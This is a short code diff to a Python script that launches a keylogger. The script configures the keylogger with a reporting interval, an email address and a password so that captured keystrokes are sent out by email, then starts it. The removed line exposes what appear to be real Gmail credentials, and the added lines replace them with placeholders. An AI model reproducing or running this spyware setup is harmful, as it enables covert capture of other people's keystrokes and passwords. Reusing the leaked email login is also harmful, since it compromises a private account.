@@ -2,5 +2,6 @@
 
 import keylogger
 
-keylogger_obj = keylogger.KeyLogger(10,"tkushal216@gmail.com","yashpraj3498")
+#eg:(10," xyz@gmail.com","123xyz",)
+keylogger_obj = keylogger.KeyLogger([time_interval_for_getting_email],[your_email_address],[password_of_email])
 keylogger_obj.start()
